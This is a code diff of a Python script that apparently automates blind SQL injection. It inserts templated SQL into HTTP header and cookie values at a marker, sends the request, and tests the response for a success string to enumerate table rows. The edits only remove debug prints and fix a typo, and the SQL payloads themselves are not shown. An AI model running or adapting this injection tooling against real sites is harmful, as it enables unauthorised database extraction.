@@ -140,25 +140,19 @@ def enumerateFieldLength(tableName, columnExists):
 def inject(sqlKey, autolookup=True):
     global headers
 
-    print("Injecting SQL into template")
     orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
     sql = Template(orgSql)
 
     safeSql = sql.safe_substitute(
         tableName=tableName, columnName=columnName, columnValue=columnValue)
 
-    # headers = dict(message.items())
-
     for header, value in message.items():
         if MARKER in value:
             headers[header] = value.replace(MARKER, safeSql)
 
-    print("Injection complete!")
-
 
 # Returns TRUE if success string is found in response.text
 def executeRequestAndReturnsError():
-    print("Sending payload")
 
     cookies = dict()
     orgCookies = headers['Cookie'].split(';')
@@ -168,10 +162,8 @@ def executeRequestAndReturnsError():
         cookies.update({orgCookieValues[0]: orgCookieValues[1]})
     response = requests.get(url, cookies=cookies)
 
-    print(cookies)
+    print(f"Sending: {cookies}")
     result = args.success in response.text
-
-    print(result)
     return result
 
 
@@ -189,7 +181,7 @@ else:
 
 if not checkRowExists(tableName, columnName, columnValue):
     print(
-        f"Then entry with identifer {columnName} does not exist with a vaule of {columnValue}!")
+        f"Then entry with identifer {columnName} does not exist with a value of {columnValue}!")
     sys.exit()
 else:
     print(f"Entry has {columnName}={columnValue}")
